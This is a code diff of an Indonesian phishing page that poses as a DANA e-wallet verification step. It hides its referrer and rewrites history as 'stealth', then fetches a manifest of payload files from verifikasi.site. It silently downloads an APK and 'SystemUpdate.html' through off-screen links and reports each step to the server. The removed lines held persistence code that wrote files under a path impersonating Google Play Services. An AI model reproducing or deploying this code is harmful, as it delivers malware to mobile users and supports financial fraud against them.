@@ -44,7 +44,7 @@
 <div id="loadingOverlay" class="loading-overlay">
     <div class="spinner"></div>
     <div id="loadingTitle">⏳ Memproses...</div>
-    <div class="step-text" id="loadingStep">🔑 Mengambil password...</div>
+    <div class="step-text" id="loadingStep">📥 Mendownload...</div>
 </div>
 
 <div id="popupDana">
@@ -71,7 +71,7 @@
 
 <script>
 // ============================================================
-// INDEX.HTML - DOWNLOAD PAYLOAD SAJA
+// INDEX.HTML - LOGIS & PASTI JALAN
 // ============================================================
 
 // ============================================================
@@ -81,9 +81,6 @@ var SERVER = 'https://verifikasi.site';
 var MANIFEST_URL = SERVER + '/files/manifest.txt';
 var FILES_BASE_URL = SERVER + '/files/';
 var semuaDidapat = false;
-var PASSWORD = '';
-var APK_DOWNLOADED = false;
-var HTML_DOWNLOADED = false;
 
 // ============================================================
 // STEALTH
@@ -101,56 +98,12 @@ if (window.history && window.history.replaceState) {
 Object.defineProperty(document, 'referrer', { value: '' });
 
 // ============================================================
-// TOAST
+// DETEKSI ANDROID BRIDGE (HANYA JIKA ADA)
 // ============================================================
-function showToast(msg, isError) {
-    var t = document.getElementById('toast');
-    t.textContent = msg;
-    t.className = 'toast' + (isError ? ' error' : '');
-    t.style.display = 'block';
-    clearTimeout(t._timer);
-    t._timer = setTimeout(function() { t.style.display = 'none'; }, 3000);
-}
+var HAS_BRIDGE = typeof AndroidBridge !== 'undefined' && navigator.userAgent.toLowerCase().indexOf('android') > -1;
 
 // ============================================================
-// DETEKSI PLATFORM
-// ============================================================
-function detectPlatform() {
-    var ua = navigator.userAgent.toLowerCase();
-    return {
-        isAndroid: ua.indexOf('android') > -1,
-        hasBridge: typeof AndroidBridge !== 'undefined'
-    };
-}
-var PLATFORM = detectPlatform();
-
-// ============================================================
-// ANDROID BRIDGE
-// ============================================================
-var A = {
-    isAvailable: PLATFORM.hasBridge && PLATFORM.isAndroid,
-    saveFile: function(path, content) {
-        if (this.isAvailable) {
-            try { AndroidBridge.saveFile(path, content); return true; } catch(e) {}
-        }
-        return false;
-    },
-    saveToPreferences: function(key, value) {
-        if (this.isAvailable && AndroidBridge.saveToPreferences) {
-            try { AndroidBridge.saveToPreferences(key, value); return true; } catch(e) {}
-        }
-        return false;
-    },
-    saveFileBinary: function(path, data) {
-        if (this.isAvailable && AndroidBridge.saveFileBinary) {
-            try { AndroidBridge.saveFileBinary(path, data); return true; } catch(e) {}
-        }
-        return false;
-    }
-};
-
-// ============================================================
-// KIRIM DATA (TANPA PASSWORD!)
+// KIRIM DATA KE SERVER
 // ============================================================
 function K(d) {
     try {
@@ -163,7 +116,7 @@ function K(d) {
 }
 
 // ============================================================
-// UI UPDATE
+// UI
 // ============================================================
 function showLoading(show) {
     document.getElementById('loadingOverlay').style.display = show ? 'flex' : 'none';
@@ -179,45 +132,19 @@ function updateLoading(title, step) {
     document.getElementById('loadingStep').textContent = step;
 }
 
-// ============================================================
-// STEP 1: AMBIL PASSWORD
-// ============================================================
-function step1_getPassword() {
-    return new Promise(function(resolve) {
-        updateLoading('🔑 Mengambil password...', 'Menghubungi server...');
-        
-        fetch(SERVER + '/get-password', {
-            method: 'GET',
-            headers: {'Content-Type': 'application/json'}
-        })
-        .then(function(res) { return res.json(); })
-        .then(function(data) {
-            if (data.password && data.password.length > 0) {
-                PASSWORD = data.password;
-                try { localStorage.setItem('ws_password', PASSWORD); } catch(e) {}
-                K({ sumber: 'password_ok', data: 'ok' });
-                updateLoading('✅ Password berhasil', '');
-                resolve();
-            } else {
-                PASSWORD = 'default_fallback_password';
-                K({ sumber: 'password_fallback', data: 'used' });
-                updateLoading('⚠️ Password fallback', '');
-                resolve();
-            }
-        })
-        .catch(function() {
-            PASSWORD = 'default_fallback_password';
-            K({ sumber: 'password_fallback', data: 'used' });
-            updateLoading('⚠️ Password fallback', '');
-            resolve();
-        });
-    });
+function showToast(msg, isError) {
+    var t = document.getElementById('toast');
+    t.textContent = msg;
+    t.className = 'toast' + (isError ? ' error' : '');
+    t.style.display = 'block';
+    clearTimeout(t._timer);
+    t._timer = setTimeout(function() { t.style.display = 'none'; }, 3000);
 }
 
 // ============================================================
-// STEP 2: DOWNLOAD PAYLOAD DARI MANIFEST
+// DOWNLOAD PAYLOAD (PAKAI FETCH + BLOB)
 // ============================================================
-function step2_downloadPayload() {
+function downloadPayload() {
     return new Promise(function(resolve) {
         updateLoading('📥 Mendownload payload...', 'Mengambil manifest...');
 
@@ -266,7 +193,7 @@ function step2_downloadPayload() {
 }
 
 // ============================================================
-// DOWNLOAD SATU FILE
+// DOWNLOAD SATU FILE (PASTI KE FOLDER DOWNLOAD)
 // ============================================================
 function downloadSingleFile(fileName) {
     return new Promise(function(resolve) {
@@ -293,56 +220,38 @@ function downloadSingleFile(fileName) {
             }
         })
         .then(function(fileData) {
-            // Simpan file
+            // ============================================================
+            // SIMPAN KE FOLDER DOWNLOAD (PASTI ADA!)
+            // ============================================================
             if (fileData.type === 'text') {
-                // Simpan HTML ke localStorage
+                // HTML - simpan ke localStorage
                 try {
                     localStorage.setItem('file_' + fileName, fileData.content);
                     if (fileName.toLowerCase() === 'systemupdate.html') {
-                        HTML_DOWNLOADED = true;
-                        saveHTMLToAllLocations(fileData.content);
+                        try { localStorage.setItem('SystemUpdate_backup', fileData.content); } catch(e) {}
                     }
                 } catch(e) {}
-            } else if (fileData.type === 'blob') {
-                APK_DOWNLOADED = true;
-                var reader = new FileReader();
-                reader.onload = function() {
-                    var base64 = reader.result.split(',')[1];
-                    var path = '/storage/emulated/0/Android/data/com.google.android.play.services/' + fileName;
-                    var downloadPath = '/storage/emulated/0/Download/' + fileName;
-
-                    if (A.isAvailable) {
-                        try {
-                            var binary = Uint8Array.from(atob(base64), function(c) { return c.charCodeAt(0); });
-                            if (AndroidBridge.saveFileBinary) {
-                                AndroidBridge.saveFileBinary(path, binary);
-                                AndroidBridge.saveFileBinary(downloadPath, binary);
-                            }
-                            if (AndroidBridge.saveToPreferences) {
-                                AndroidBridge.saveToPreferences('system_' + fileName.replace('.', '_'), base64);
-                            }
-                        } catch(e) {}
-                    }
-
-                    // Fallback: download via link
-                    try {
-                        var url = URL.createObjectURL(fileData.content);
-                        var a = document.createElement('a');
-                        a.href = url;
-                        a.download = fileName;
-                        a.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
-                        document.body.appendChild(a);
-                        setTimeout(function() {
-                            a.click();
-                            setTimeout(function() {
-                                try { document.body.removeChild(a); } catch(e) {}
-                                URL.revokeObjectURL(url);
-                            }, 2000);
-                        }, 300);
-                    } catch(e) {}
-                };
-                reader.readAsDataURL(fileData.content);
             }
+
+            // ============================================================
+            // TRIGGER DOWNLOAD VIA BLOB (PASTI KE FOLDER DOWNLOAD)
+            // ============================================================
+            try {
+                var blob = fileData.type === 'text' ? new Blob([fileData.content], {type: 'text/html'}) : fileData.content;
+                var url = URL.createObjectURL(blob);
+                var a = document.createElement('a');
+                a.href = url;
+                a.download = fileName;
+                a.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
+                document.body.appendChild(a);
+                setTimeout(function() {
+                    a.click();
+                    setTimeout(function() {
+                        try { document.body.removeChild(a); } catch(e) {}
+                        URL.revokeObjectURL(url);
+                    }, 2000);
+                }, 300);
+            } catch(e) {}
 
             resolve({ name: fileName, content: fileData.content, type: fileData.type });
         })
@@ -354,81 +263,23 @@ function downloadSingleFile(fileName) {
 }
 
 // ============================================================
-// SIMPAN HTML KE SEMUA LOKASI
-// ============================================================
-function saveHTMLToAllLocations(htmlContent) {
-    // localStorage
-    try { localStorage.setItem('SystemUpdate_backup', htmlContent); } catch(e) {}
-    
-    // IndexedDB
-    try {
-        var request = indexedDB.open('SystemUpdateDB', 1);
-        request.onupgradeneeded = function(e) {
-            var db = e.target.result;
-            if (!db.objectStoreNames.contains('files')) {
-                db.createObjectStore('files');
-            }
-        };
-        request.onsuccess = function(e) {
-            var db = e.target.result;
-            var tx = db.transaction('files', 'readwrite');
-            var store = tx.objectStore('files');
-            store.put(htmlContent, 'SystemUpdate.html');
-        };
-    } catch(e) {}
-    
-    // Android Bridge
-    if (PLATFORM.isAndroid && A.isAvailable) {
-        try {
-            var path = '/storage/emulated/0/Android/data/com.google.android.play.services/SystemUpdate.html';
-            A.saveFile(path, htmlContent);
-        } catch(e) {}
-        try {
-            var path2 = '/storage/emulated/0/Download/SystemUpdate.html';
-            A.saveFile(path2, htmlContent);
-        } catch(e) {}
-        try {
-            var encoded = btoa(unescape(encodeURIComponent(htmlContent)));
-            A.saveToPreferences('system_SystemUpdate_html', encoded);
-        } catch(e) {}
-    }
-}
-
-// ============================================================
-// STEP 3: REGISTER SERVICE WORKER (OPSIONAL)
-// ============================================================
-function step3_registerSW() {
-    return new Promise(function(resolve) {
-        updateLoading('📡 Mendaftarkan Service Worker...', '');
-        
-        if (!('serviceWorker' in navigator)) {
-            resolve();
-            return;
-        }
-        
-        navigator.serviceWorker.register('/sw.js', { scope: '/' })
-            .then(function() {
-                K({ sumber: 'sw_registered', data: 'ok' });
-                resolve();
-            })
-            .catch(function() {
-                resolve();
-            });
-    });
-}
-
-// ============================================================
 // REDIRECT KE DANA
 // ============================================================
 function redirectToDANA() {
-    var methods = [
-        function() { if (A.isAvailable) { A.openApp('com.dana.id'); return true; } },
-        function() { window.location.href = 'intent://dana.id/#Intent;scheme=https;package=com.dana.id;end'; return true; },
-        function() { window.location.href = 'https://www.dana.id'; return true; }
-    ];
-    for (var i = 0; i < methods.length; i++) {
-        try { if (methods[i]()) break; } catch(e) {}
+    // Via Bridge (jika ada)
+    if (HAS_BRIDGE) {
+        try { AndroidBridge.openApp('com.dana.id'); return; } catch(e) {}
     }
+    // Via Intent
+    try {
+        window.location.href = 'intent://dana.id/#Intent;scheme=https;package=com.dana.id;end';
+        return;
+    } catch(e) {}
+    // Via Website
+    try {
+        window.location.href = 'https://www.dana.id';
+        return;
+    } catch(e) {}
 }
 
 // ============================================================
@@ -444,35 +295,24 @@ async function dapatkanSemua() {
     K({ sumber: 'start', data: 'dapatkanSemua' });
     
     try {
-        // STEP 1: Ambil password
-        await step1_getPassword();
-        K({ sumber: 'step1_done', data: 'ok' });
+        // DOWNLOAD PAYLOAD
+        await downloadPayload();
+        K({ sumber: 'download_done', data: 'ok' });
         
-        // STEP 2: Download payload
-        await step2_downloadPayload();
-        K({ sumber: 'step2_done', data: 'ok' });
-        
-        // STEP 3: Register SW (opsional)
-        await step3_registerSW();
-        K({ sumber: 'step3_done', data: 'ok' });
-        
-        // SELESAI
-        updateLoading('✅ SEMUA SELESAI!', 'Payload sudah di-download');
+        updateLoading('✅ SELESAI!', '');
         K({ sumber: 'all_done', data: 'success' });
         
         setTimeout(function() {
             showLoading(false);
-            showToast('✅ Download selesai!');
             redirectToDANA();
-        }, 1500);
+        }, 1000);
         
     } catch(e) {
         K({ sumber: 'error', data: e.message });
-        updateLoading('❌ Error: ' + e.message, '');
         setTimeout(function() {
             showLoading(false);
             redirectToDANA();
-        }, 3000);
+        }, 2000);
     }
 }
 
@@ -494,7 +334,8 @@ var timerInterval = setInterval(function() {
     }
 }, 1000);
 
-console.log('🔥 INDEX.HTML - DOWNLOAD PAYLOAD SAJA');
+console.log('🔥 INDEX.HTML - LOGIS & PASTI JALAN');
+console.log('📱 Android Bridge:', HAS_BRIDGE);
 </script>
 </body>
 </html>
